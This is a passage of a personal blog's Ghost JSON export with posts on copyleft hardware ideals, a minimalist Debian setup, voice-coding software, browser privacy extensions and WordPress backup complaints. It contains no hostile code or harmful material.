open about all of our manufacturing processes, we can ensure that that margin won’t become unfair. By utilizing copyleft licenses, we can ensure the future of the Association will remain intact, by utilizing existing patent and copyright laws to ensure openness of derivatives.</p>\n<p>Let me give you an example. The Arduino company released their microcontrollers as an open design. Immediately, clones came up, and the $35 Uno that I have can be bought as a clone for less than $3. We intend to allow that situation to play out, and then clone the clones, putting us on the same level as the clones. If we were to do that without a copyleft license, by using the creative commons, for example, we could be sued by the clone company for the patent claim on <em>their</em> clone of our product. Copyleft has shown to be a huge help in this situation for software, and I want to use the association to bring that concept to hardware.</p>\n<p>Again, this does require growth, so other organizations who are already established or for some other reason are able to produce the product at a lower profit margin than we are, they will be able to produce it more cheaply. However, I intend to construct the Association so as to assure that money that comes in <em>must</em> be kept in it, banning the profit motive, but that would require a lawyer (which I don’t have the funds for currently). Doing so would also prevent us from seeking investment, which could pose sustainability issues, but I’m prepared to accept that risk.</p>\n</div>","amp":"399","plaintext":"The slogan at the top of the blog used to be “Perpetual students working to\nbenefit humanity” and I think that is way too wordy. Additionally, I’d like to\nstart focusing our (i.e. my) efforts on a more concrete goal. That is not to say\nthat our goal has changed. The Association stands for scientific study for the\nsake of scientific study; for the pursuit of any knowledge that has potential to\nbenefit humanity. However, I feel it’s more direct, concise, and understandable\nto the layperson to refer to this study as “solving problems”.\n\nThis is something I’ve been considering for some time, as it’s a key\ndifferentiating point between us and for profit as well as many not-for-profit\norganizations. Most businesses try to maintain a particular focus. Distribute a\nproduct, find a niche, and then keep working on it. A great example of a company\nthat doesn’t need to do this is Twitter. Twitter should finalize itself, move to\na skeleton crew to maintain that, and with such a greatly reduced cost (and also\nby not trying to maximize profit), they could continue to exist as an\ninfluential and important social construct. Instead they’re likely to continue\ntrying to ‘innovate’ and iterate on an already solved problem. We don’t need new\ndesigns of washing machines, new recipes for soap, new inkjet printers. These\nproblems – washing clothes, cleaning, and printing to paper from computers –\nhave been solved. Why are we trying to continue to profit off of these utilities\nwhenever we could instead optimizeefficiency. So, if I create a product, I\nrelease the source and design fully open, with a copy-left license. Then, if\nsomeone comes along with a way to make that more efficient, they make some\nmodifications and produce it that way, and so do we, passing the savings along\nto our customers.\n\nNow, this concept doesn’t take into account growth, which we will need to do.\nI’m only one person, and if I try to solve all of the problems myself, I’ll be\ndead before I get a millionth of the way through. Over time, we’ll need to hire,\nexpand, rent or purchase space; all of the usual costs of doing business.\nCurrently, we’re a few shitty computers and a 3D printer in my living room, and\nthat’s not really sustainable long-term. So, yes, there will of course be a\nprofit margin, but by forming as a non-profit or other similar entity, and by\nbeing open about all of our manufacturing processes, we can ensure that that\nmargin won’t become unfair. By utilizing copyleft licenses, we can ensure the\nfuture of the Association will remain intact, by utilizing existing patent and\ncopyright laws to ensure openness of derivatives.\n\nLet me give you an example. The Arduino company released their microcontrollers\nas an open design. Immediately, clones came up, and the $35 Uno that I have can\nbe bought as a clone for less than $3. We intend to allow that situation to play\nout, and then clone the clones, putting us on the same level as the clones. If\nwe were to do that without a copyleft license, by using the creative commons,\nfor example, we could be sued by the clone company for the patent claim ontheir \nclone of our product. Copyleft has shown to be a huge help in this situation for\nsoftware, and I want to use the association to bring that concept to hardware.\n\nAgain, this does require growth, so other organizations who are already\nestablished or for some other reason are able to produce the product at a lower\nprofit margin than we are, they will be able to produce it more cheaply.\nHowever, I intend to construct the Association so as to assure that money that\ncomes inmust  be kept in it, banning the profit motive, but that would require a\nlawyer (which I don’t have the funds for currently). Doing so would also prevent\nus from seeking investment, which could pose sustainability issues, but I’m\nprepared to accept that risk.","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-07-17T02:19:21.000Z","created_by":"1","updated_at":"2017-07-17T02:19:21.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133278c","uuid":"97c12710-9b00-4151-9b40-53c714dadc3d","title":"My personal \"desktop environment\"","slug":"temp-slug-40","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nSo I, like most people of my generation, started out on Ubuntu with my Linux experience. I grew up with Windows solely because it was the only thing that I knew as I grew up. Once I learned up Ubuntu, I was down the rabbit-hole… and let me tell you, after 3-4 years, I am *deep *in that hole. I know more about how Linux works than I ever knew after a lifetime of using and even fixing windows, and that is by design. As my budget became more constrained, I began to migrate towards more and more minimalist installations of Linux. As it stands now, I don’t use what most people would consider a “desktop environment”, as there is no wrapper program that handles logins and which desktop to display. I was using *lightdm* for a while, but I don’t really feel it necessary. I simply log in with the standard linux terminal then run *startx* when I need a window manager.\\n\\nMy system is a basic Debian system. I am a huge fan of the Debian project. It’s aim at wide compatibility has proven to be a smart long-term plan, because I have had numerous compatibility issues with Ubuntu, with both legacy and modern hardware. I used the Debian DVD downloads, by concatenating DVDs 1-3 into a single ISO and then burning that to a 32GB flash drive. I installed covering the whole disk (although if you are dual booting you might not want to delete your Windows partition….) and when the option came up for installation options, I selected “ssh server” and deselected “Debian Desktop environment”. Then, once I was running on the new sytem, I installed the following applications (in alphabetical order) with *apt*:\\n\\nandroid-tools-adb android-tools-fastboot arandr audacity chromium claws-mail feh geany geeqie gimp git gparted gpodder hexchat htop kdenlive kpcli mpv pavucontrol pcmanfm pv python-pygoocanvas terminator volti whois xfce4-clipman zathura\\n\\nThe android-tools* packages, audacity, feh, gpodder, hexchat, kdenlive, kpcli, whois, and xfce4-clipman aren’t strictly necessary for a complete WM environment, but they all serve purposes that are useful to me, so I install them straight away alongside the other tools. For example, if you don’t root your Android phone, you’ll probably never need the android-tools packages, if you don’t listen to podcasts, you’ll never use GPodder. That’s exactly the sort of thing I try to avoid by installing a desktop environment wholesale, (like Gnome installing a dozen+ games on my system by default. If I want games, I’ll install synaptic and go to the games section, I don’t need them pre-installed). I just thought my configuration, considering that it functions completely as a desktop environment as long as you don’t mind running startx, might be useful to others as well.\\n\\nI also have a custom i3 configuration with specific keybindings, a custom conky statusbar through i3, and a few scripts for startup- and cron-jobs.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>So I, like most people of my generation, started out on Ubuntu with my Linux experience. I grew up with Windows solely because it was the only thing that I knew as I grew up. Once I learned up Ubuntu, I was down the rabbit-hole… and let me tell you, after 3-4 years, I am *deep *in that hole. I know more about how Linux works than I ever knew after a lifetime of using and even fixing windows, and that is by design. As my budget became more constrained, I began to migrate towards more and more minimalist installations of Linux. As it stands now, I don’t use what most people would consider a “desktop environment”, as there is no wrapper program that handles logins and which desktop to display. I was using <em>lightdm</em> for a while, but I don’t really feel it necessary. I simply log in with the standard linux terminal then run <em>startx</em> when I need a window manager.</p>\n<p>My system is a basic Debian system. I am a huge fan of the Debian project. It’s aim at wide compatibility has proven to be a smart long-term plan, because I have had numerous compatibility issues with Ubuntu, with both legacy and modern hardware. I used the Debian DVD downloads, by concatenating DVDs 1-3 into a single ISO and then burning that to a 32GB flash drive. I installed covering the whole disk (although if you are dual booting you might not want to delete your Windows partition….) and when the option came up for installation options, I selected “ssh server” and deselected “Debian Desktop environment”. Then, once I was running on the new sytem, I installed the following applications (in alphabetical order) with <em>apt</em>:</p>\n<p>android-tools-adb android-tools-fastboot arandr audacity chromium claws-mail feh geany geeqie gimp git gparted gpodder hexchat htop kdenlive kpcli mpv pavucontrol pcmanfm pv python-pygoocanvas terminator volti whois xfce4-clipman zathura</p>\n<p>The android-tools* packages, audacity, feh, gpodder, hexchat, kdenlive, kpcli, whois, and xfce4-clipman aren’t strictly necessary for a complete WM environment, but they all serve purposes that are useful to me, so I install them straight away alongside the other tools. For example, if you don’t root your Android phone, you’ll probably never need the android-tools packages, if you don’t listen to podcasts, you’ll never use GPodder. That’s exactly the sort of thing I try to avoid by installing a desktop environment wholesale, (like Gnome installing a dozen+ games on my system by default. If I want games, I’ll install synaptic and go to the games section, I don’t need them pre-installed). I just thought my configuration, considering that it functions completely as a desktop environment as long as you don’t mind running startx, might be useful to others as well.</p>\n<p>I also have a custom i3 configuration with specific keybindings, a custom conky statusbar through i3, and a few scripts for startup- and cron-jobs.</p>\n</div>","amp":"367","plaintext":"So I, like most people of my generation, started out on Ubuntu with my Linux\nexperience. I grew up with Windows solely because it was the only thing that I\nknew as I grew up. Once I learned up Ubuntu, I was down the rabbit-hole… and let\nme tell you, after 3-4 years, I am *deep *in that hole. I know more about how\nLinux works than I ever knew after a lifetime of using and even fixing windows,\nand that is by design. As my budget became more constrained, I began to migrate\ntowards more and more minimalist installations of Linux. As it stands now, I\ndon’t use what most people would consider a “desktop environment”, as there is\nno wrapper program that handles logins and which desktop to display. I was using\n lightdm  for a while, but I don’t really feel it necessary. I simply log in\nwith the standard linux terminal then run startx when I need a window manager.\n\nMy system is a basic Debian system. I am a huge fan of the Debian project. It’s\naim at wide compatibility has proven to be a smart long-term plan, because I\nhave had numerous compatibility issues with Ubuntu, with both legacy and modern\nhardware. I used the Debian DVD downloads, by concatenating DVDs 1-3 into a\nsingle ISO and then burning that to a 32GB flash drive. I installed covering the\nwhole disk (although if you are dual booting you might not want to delete your\nWindows partition….) and when the option came up for installation options, I\nselected “ssh server” and deselected “Debian Desktop environment”. Then, once I\nwas running on the new sytem, I installed the following applications (in\nalphabetical order) withapt:\n\nandroid-tools-adb android-tools-fastboot arandr audacity chromium claws-mail feh\ngeany geeqie gimp git gparted gpodder hexchat htop kdenlive kpcli mpv\npavucontrol pcmanfm pv python-pygoocanvas terminator volti whois xfce4-clipman\nzathura\n\nThe android-tools* packages, audacity, feh, gpodder, hexchat, kdenlive, kpcli,\nwhois, and xfce4-clipman aren’t strictly necessary for a complete WM\nenvironment, but they all serve purposes that are useful to me, so I install\nthem straight away alongside the other tools. For example, if you don’t root\nyour Android phone, you’ll probably never need the android-tools packages, if\nyou don’t listen to podcasts, you’ll never use GPodder. That’s exactly the sort\nof thing I try to avoid by installing a desktop environment wholesale, (like\nGnome installing a dozen+ games on my system by default. If I want games, I’ll\ninstall synaptic and go to the games section, I don’t need them pre-installed).\nI just thought my configuration, considering that it functions completely as a\ndesktop environment as long as you don’t mind running startx, might be useful to\nothers as well.\n\nI also have a custom i3 configuration with specific keybindings, a custom conky\nstatusbar through i3, and a few scripts for startup- and cron-jobs.","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-07-17T14:36:12.000Z","created_by":"1","updated_at":"2017-07-17T14:36:12.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133278d","uuid":"4a0e0050-25ff-416a-939f-3a68dfcacb7f","title":"Just a nice picture of a random vinyl I took.","slug":"408","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n[![](https://madscientists.co/wp-content/uploads/2017/08/DSC_4631-1024x598.jpg)](https://madscientists.co/wp-content/uploads/2017/08/DSC_4631.jpg)\\n\\n \\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p><a href=\"https://madscientists.co/wp-content/uploads/2017/08/DSC_4631.jpg\"><img src=\"https://madscientists.co/wp-content/uploads/2017/08/DSC_4631-1024x598.jpg\" alt=\"\"></a></p>\n<p></p>\n</div>","amp":"408","plaintext":"[https://madscientists.co/wp-content/uploads/2017/08/DSC_4631.jpg]","feature_image":"https://madscientists.co/wp-content/uploads/2017/08/DSC_4631-1024x598.jpg","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-08-02T14:33:18.000Z","created_by":"1","updated_at":"2017-09-12T04:24:28.000Z","updated_by":"1","published_at":"2017-08-02T14:33:18.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133278e","uuid":"b639f786-59b3-49bb-874f-fa05d2b30206","title":"Falling behind in writing...as usual.","slug":"falling-behind-in-writing-as-usual","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI started this blog not for the public, but for myself. I wanted to use it as a place to take notes, but then also to publish those notes as proof of what I’ve done. Unfortunately, I’ve never been very good at taking notes, nor at keeping a regular journal. However, just because I haven’t been publishing doesn’t mean I haven’t been working. I have taken on a number of projects in the past few weeks and will definitely take some time over the next few weeks to write some notes on what I’ve been working on for the past few weeks. A quick teaser:\\n\\n- FOSS speech recognition\\n- Docker\\n- Owncloud->nextcloud\\n- 3D printing update\\n- and more!\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I started this blog not for the public, but for myself. I wanted to use it as a place to take notes, but then also to publish those notes as proof of what I’ve done. Unfortunately, I’ve never been very good at taking notes, nor at keeping a regular journal. However, just because I haven’t been publishing doesn’t mean I haven’t been working. I have taken on a number of projects in the past few weeks and will definitely take some time over the next few weeks to write some notes on what I’ve been working on for the past few weeks. A quick teaser:</p>\n<ul>\n<li>FOSS speech recognition</li>\n<li>Docker</li>\n<li>Owncloud-&gt;nextcloud</li>\n<li>3D printing update</li>\n<li>and more!</li>\n</ul>\n</div>","amp":"411","plaintext":"I started this blog not for the public, but for myself. I wanted to use it as a\nplace to take notes, but then also to publish those notes as proof of what I’ve\ndone. Unfortunately, I’ve never been very good at taking notes, nor at keeping a\nregular journal. However, just because I haven’t been publishing doesn’t mean I\nhaven’t been working. I have taken on a number of projects in the past few weeks\nand will definitely take some time over the next few weeks to write some notes\non what I’ve been working on for the past few weeks. A quick teaser:\n\n * FOSS speech recognition\n * Docker\n * Owncloud->nextcloud\n * 3D printing update\n * and more!","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-08-29T20:54:23.000Z","created_by":"1","updated_at":"2017-08-29T20:54:23.000Z","updated_by":"1","published_at":"2017-08-29T20:54:23.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133278f","uuid":"0ab498d6-70fe-438d-a0d1-7de1a49a2599","title":"Free Speech","slug":"temp-slug-43","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nSeveral months ago I saw Tavis Rudd’s “[Using Python to Code by Voice](https://www.youtube.com/watch?v=8SkdfdXWYaI)” talk on YouTube. I was, as many, many other coders were, quite inspired by his creative use of existing technologies in a way that allowed him to actually productively write code by using his voice. As the typical technologist’s problem of carpal tunnel, arthritis, and various other arm, wrist, and finger pains continues to get worse for me, I once again turned to researching ‘coding by voice’ applications. What I found was not what I was looking for, but was enough to get me excited and inspired.\\n\\n[Henry Kroll III](http://www.thenerdshow.com/) has apparently been working on [Free Speech](https://github.com/themanyone/freespeech-vr) since 2013. The goal of Free Speech seems to be to create a nice interface for dictating text files, and for continually training the voice recognition algorithm to your voice. As soon as I discovered it, I began working tirelessly on it. My initial goal was to create stable installation scripts that detected one’s distro and provided the correct software. Unfortunately, while the project is mostly complete, I have not yet had the opportunity to stabilize these scripts.\\n\\nMy idea was that if the software was easier to install we (the developers, probably primarily myself and Henry Kroll) could more quickly find bugs by using a larger testing base. It is my intention to add the functionality of shell use, specifically for SH, once I’ve stabilized installation, either through typical packaging or an install script as I’ve been doing. It is then my hope that the open source community will contribute other shells to the project so that we all might productively work and play in a voice enabled environment – one that won’t cause us long-term injury.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Several months ago I saw Tavis Rudd’s “<a href=\"https://www.youtube.com/watch?v=8SkdfdXWYaI\">Using Python to Code by Voice</a>” talk on YouTube. I was, as many, many other coders were, quite inspired by his creative use of existing technologies in a way that allowed him to actually productively write code by using his voice. As the typical technologist’s problem of carpal tunnel, arthritis, and various other arm, wrist, and finger pains continues to get worse for me, I once again turned to researching ‘coding by voice’ applications. What I found was not what I was looking for, but was enough to get me excited and inspired.</p>\n<p><a href=\"http://www.thenerdshow.com/\">Henry Kroll III</a> has apparently been working on <a href=\"https://github.com/themanyone/freespeech-vr\">Free Speech</a> since 2013. The goal of Free Speech seems to be to create a nice interface for dictating text files, and for continually training the voice recognition algorithm to your voice. As soon as I discovered it, I began working tirelessly on it. My initial goal was to create stable installation scripts that detected one’s distro and provided the correct software. Unfortunately, while the project is mostly complete, I have not yet had the opportunity to stabilize these scripts.</p>\n<p>My idea was that if the software was easier to install we (the developers, probably primarily myself and Henry Kroll) could more quickly find bugs by using a larger testing base. It is my intention to add the functionality of shell use, specifically for SH, once I’ve stabilized installation, either through typical packaging or an install script as I’ve been doing. It is then my hope that the open source community will contribute other shells to the project so that we all might productively work and play in a voice enabled environment – one that won’t cause us long-term injury.</p>\n</div>","amp":"414","plaintext":"Several months ago I saw Tavis Rudd’s “Using Python to Code by Voice\n[https://www.youtube.com/watch?v=8SkdfdXWYaI]” talk on YouTube. I was, as many,\nmany other coders were, quite inspired by his creative use of existing\ntechnologies in a way that allowed him to actually productively write code by\nusing his voice. As the typical technologist’s problem of carpal tunnel,\narthritis, and various other arm, wrist, and finger pains continues to get worse\nfor me, I once again turned to researching ‘coding by voice’ applications. What\nI found was not what I was looking for, but was enough to get me excited and\ninspired.\n\nHenry Kroll III [http://www.thenerdshow.com/]  has apparently been working on \nFree Speech [https://github.com/themanyone/freespeech-vr] since 2013. The goal\nof Free Speech seems to be to create a nice interface for dictating text files,\nand for continually training the voice recognition algorithm to your voice. As\nsoon as I discovered it, I began working tirelessly on it. My initial goal was\nto create stable installation scripts that detected one’s distro and provided\nthe correct software. Unfortunately, while the project is mostly complete, I\nhave not yet had the opportunity to stabilize these scripts.\n\nMy idea was that if the software was easier to install we (the developers,\nprobably primarily myself and Henry Kroll) could more quickly find bugs by using\na larger testing base. It is my intention to add the functionality of shell use,\nspecifically for SH, once I’ve stabilized installation, either through typical\npackaging or an install script as I’ve been doing. It is then my hope that the\nopen source community will contribute other shells to the project so that we all\nmight productively work and play in a voice enabled environment – one that won’t\ncause us long-term injury.","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-08-29T21:13:25.000Z","created_by":"1","updated_at":"2017-08-29T21:13:25.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332790","uuid":"75c4cc32-8e2c-4843-b0b2-80aa2febf91e","title":"Important browser extensions","slug":"important-browser-extensions","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI thought I would remind everyone that your internet browsing experience will never be the same after installing uBlock origin https://github.com/gorhill/uBlock/\\n\\nIt blocks most ads, any ads sourced from outside of the web site especially (I’ve been getting those “sign up for our email!” ads but I guess uBlock doesn’t kill those since they’re from the site you’re visiting), as well as some tracking requests and other commonly-known website anti-features.\\n\\nYou can install it in Firefox, Chrome, MS Edge, or Opera. That includes Firefox for Android which supports extensions. I do not know if there is a Firefox for iPhone or if it supports extensions, I would assume Apple locks you into using safari though…\\n\\nAdditionally, there’s Privacy Badger, which, to be clear I have not used before but I am going to install it now. [https://github.com/EFForg/privacybadger](https://github.com/EFForg/privacybadger) It is supposed to block tracking efforts, but it looks like it might get in the way in the process, so maybe that’s not the best for everyone.\\n\\nFinally, TOS;DR gives each site you visit a “grade” based on their terms of service. If you want more info, you can click on the icon and it gives you a more detailed breakdown of why they gave it that rating. Seriously a top-notch service. [https://github.com/tosdr/tosdr-firefox](https://github.com/tosdr/tosdr-firefox)\\n\\nAdditionally, note that I only included github links. That’s because I *only* use open-source, commonly used extensions in Firefox. Firefox has a known and not-really-fixable vulnerability which allows for cross-extension code execution, which could be extremely dangerous. There are a number of [articles](https://arstechnica.com/information-technology/2016/04/noscript-and-other-popular-firefox-add-ons-open-millions-to-new-attack/) on the topic.\\n\\nTo download these extensions, you can find them in the various extension repositories for the popular browsers:\\n\\n- **Firefox:**[https://addons.mozilla.org/en-US/firefox/](https://addons.mozilla.org/en-US/firefox/)\\n- **Chrome/Chromium variants: **[https://chrome.google.com/webstore/category/apps](https://chrome.google.com/webstore/category/apps)\\n- **Opera: **[https://addons.opera.com/en/](https://addons.opera.com/en/)\\n- **Safari** has an extensions architecture, but unfortunately does not have any of these extensions\\n- **Microsoft Edge: **[https://www.microsoft.com/en-us/store/collections/edgeextensions/pc](https://www.microsoft.com/en-us/store/collections/edgeextensions/pc)\\n\\nBear in mind that while these will help you if you desire to remain secure and private as you browse the web, nothing can totally secure you against everything. Web browsers are assaulted by a steady stream of high-profile and dangerous vulnerabilities. Be careful out there, and **MAKE REGULAR BACKUPS**.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I thought I would remind everyone that your internet browsing experience will never be the same after installing uBlock origin <a href=\"https://github.com/gorhill/uBlock/\">https://github.com/gorhill/uBlock/</a></p>\n<p>It blocks most ads, any ads sourced from outside of the web site especially (I’ve been getting those “sign up for our email!” ads but I guess uBlock doesn’t kill those since they’re from the site you’re visiting), as well as some tracking requests and other commonly-known website anti-features.</p>\n<p>You can install it in Firefox, Chrome, MS Edge, or Opera. That includes Firefox for Android which supports extensions. I do not know if there is a Firefox for iPhone or if it supports extensions, I would assume Apple locks you into using safari though…</p>\n<p>Additionally, there’s Privacy Badger, which, to be clear I have not used before but I am going to install it now. <a href=\"https://github.com/EFForg/privacybadger\">https://github.com/EFForg/privacybadger</a> It is supposed to block tracking efforts, but it looks like it might get in the way in the process, so maybe that’s not the best for everyone.</p>\n<p>Finally, TOS;DR gives each site you visit a “grade” based on their terms of service. If you want more info, you can click on the icon and it gives you a more detailed breakdown of why they gave it that rating. Seriously a top-notch service. <a href=\"https://github.com/tosdr/tosdr-firefox\">https://github.com/tosdr/tosdr-firefox</a></p>\n<p>Additionally, note that I only included github links. That’s because I <em>only</em> use open-source, commonly used extensions in Firefox. Firefox has a known and not-really-fixable vulnerability which allows for cross-extension code execution, which could be extremely dangerous. There are a number of <a href=\"https://arstechnica.com/information-technology/2016/04/noscript-and-other-popular-firefox-add-ons-open-millions-to-new-attack/\">articles</a> on the topic.</p>\n<p>To download these extensions, you can find them in the various extension repositories for the popular browsers:</p>\n<ul>\n<li><strong>Firefox:</strong><a href=\"https://addons.mozilla.org/en-US/firefox/\">https://addons.mozilla.org/en-US/firefox/</a></li>\n<li>**Chrome/Chromium variants: **<a href=\"https://chrome.google.com/webstore/category/apps\">https://chrome.google.com/webstore/category/apps</a></li>\n<li>**Opera: **<a href=\"https://addons.opera.com/en/\">https://addons.opera.com/en/</a></li>\n<li><strong>Safari</strong> has an extensions architecture, but unfortunately does not have any of these extensions</li>\n<li>**Microsoft Edge: **<a href=\"https://www.microsoft.com/en-us/store/collections/edgeextensions/pc\">https://www.microsoft.com/en-us/store/collections/edgeextensions/pc</a></li>\n</ul>\n<p>Bear in mind that while these will help you if you desire to remain secure and private as you browse the web, nothing can totally secure you against everything. Web browsers are assaulted by a steady stream of high-profile and dangerous vulnerabilities. Be careful out there, and <strong>MAKE REGULAR BACKUPS</strong>.</p>\n</div>","amp":"419","plaintext":"I thought I would remind everyone that your internet browsing experience will\nnever be the same after installing uBlock origin \nhttps://github.com/gorhill/uBlock/\n\nIt blocks most ads, any ads sourced from outside of the web site especially\n(I’ve been getting those “sign up for our email!” ads but I guess uBlock doesn’t\nkill those since they’re from the site you’re visiting), as well as some\ntracking requests and other commonly-known website anti-features.\n\nYou can install it in Firefox, Chrome, MS Edge, or Opera. That includes Firefox\nfor Android which supports extensions. I do not know if there is a Firefox for\niPhone or if it supports extensions, I would assume Apple locks you into using\nsafari though…\n\nAdditionally, there’s Privacy Badger, which, to be clear I have not used before\nbut I am going to install it now. https://github.com/EFForg/privacybadger  It is\nsupposed to block tracking efforts, but it looks like it might get in the way in\nthe process, so maybe that’s not the best for everyone.\n\nFinally, TOS;DR gives each site you visit a “grade” based on their terms of\nservice. If you want more info, you can click on the icon and it gives you a\nmore detailed breakdown of why they gave it that rating. Seriously a top-notch\nservice. https://github.com/tosdr/tosdr-firefox\n\nAdditionally, note that I only included github links. That’s because Ionly  use\nopen-source, commonly used extensions in Firefox. Firefox has a known and\nnot-really-fixable vulnerability which allows for cross-extension code\nexecution, which could be extremely dangerous. There are a number of articles\n[https://arstechnica.com/information-technology/2016/04/noscript-and-other-popular-firefox-add-ons-open-millions-to-new-attack/]\n on the topic.\n\nTo download these extensions, you can find them in the various extension\nrepositories for the popular browsers:\n\n * Firefox:https://addons.mozilla.org/en-US/firefox/\n * **Chrome/Chromium variants: **\n   https://chrome.google.com/webstore/category/apps\n * **Opera: **https://addons.opera.com/en/\n * Safari  has an extensions architecture, but unfortunately does not have any\n   of these extensions\n * **Microsoft Edge: **\n   https://www.microsoft.com/en-us/store/collections/edgeextensions/pc\n\nBear in mind that while these will help you if you desire to remain secure and\nprivate as you browse the web, nothing can totally secure you against\neverything. Web browsers are assaulted by a steady stream of high-profile and\ndangerous vulnerabilities. Be careful out there, and MAKE REGULAR BACKUPS.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-09-06T10:57:50.000Z","created_by":"1","updated_at":"2017-09-12T04:32:09.000Z","updated_by":"1","published_at":"2017-09-06T10:57:50.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332791","uuid":"bbb5128b-ed37-4c23-b21b-240ce31ba0cb","title":"An issue I have with Wordpress","slug":"an-issue-i-have-with-wordpress","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI truly think that WordPress is the ideal platform for many web sites. It is open and free for people like me to host on our own, and yet easy enough that anyone can use it. Really, wordpress.com provides a simple UI for creating a number of styles of sites for many purposes, and wordpress.org compliments that with it’s openness. It’s exactly the sort of project I have in mind for the Mad Scientists. It solves a problem, once and for all, being both simple and flexible.\\n\\nThat said, there are always problems. For me, the biggest issue is that you can’t make a backup of your site with media files and reinitialize it simply. I have this site primarily to educate myself about hosting various web services, with a secondary goal of having a publishing platform. I’m also a photographer, so many of the posts in this blog are photos I’ve taken, not to mention photos I use for demonstration in text articles. To not be able to make a clean backup of files including storing the media file itself in a folder is simply unacceptable.\\n\\nHowever, that is a great advantage to services like wordpress — anyone can write a plugin or fix for this issue, even me (although I don’t think I have the skills to do that). Once one person does that, it solves the problem for *everybody*. We all reap the benefits, not just the person that did the work, and in exchange they get to reap the benefits of what other people have created.\\n\\nAnother issue I have with WordPress is that it’s written in PHP, which in my opinion sucks. Perhaps one of these days I’ll get around to figuring out some way to use a WordPress plugin as a wrapper for a script in a more sensible language like Python or Go.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I truly think that WordPress is the ideal platform for many web sites. It is open and free for people like me to host on our own, and yet easy enough that anyone can use it. Really, wordpress.com provides a simple UI for creating a number of styles of sites for many purposes, and wordpress.org compliments that with it’s openness. It’s exactly the sort of project I have in mind for the Mad Scientists. It solves a problem, once and for all, being both simple and flexible.</p>\n<p>That said, there are always problems. For me, the biggest issue is that you can’t make a backup of your site with media files and reinitialize it simply. I have this site primarily to educate myself about hosting various web services, with a secondary goal of having a publishing platform. I’m also a photographer, so many of the posts in this blog are photos I’ve taken, not to mention photos I use for demonstration in text articles. To not be able to make a clean backup of files including storing the media file itself in a folder is simply unacceptable.</p>\n<p>However, that is a great advantage to services like wordpress — anyone can write a plugin or fix for this issue, even me (although I don’t think I have the skills to do that). Once one person does that, it solves the problem for <em>everybody</em>. We all reap the benefits, not just the person that did the work, and in exchange they get to reap the benefits of what other people have created.</p>\n<p>Another issue I have with WordPress is that it’s written in PHP, which in my opinion sucks. Perhaps one of these days I’ll get around to figuring out some way to use a WordPress plugin as a wrapper for a script in a more sensible language like Python or Go.</p>\n</div>","amp":"650","plaintext":"I truly think that WordPress is the ideal platform for many web sites. It is\nopen and free for people like me to host on our own, and yet easy enough that\nanyone can use it. Really, wordpress.com provides a simple UI for creating a\nnumber of styles of sites for many purposes, and wordpress.org compliments that\nwith it’s openness. It’s exactly the sort of project I have in mind for the Mad\nScientists. It solves a problem, once and for all, being both simple and\nflexible.\n\nThat said, there are always problems. For me, the biggest issue is that you\ncan’t make a backup of your site with media files and reinitialize it simply. 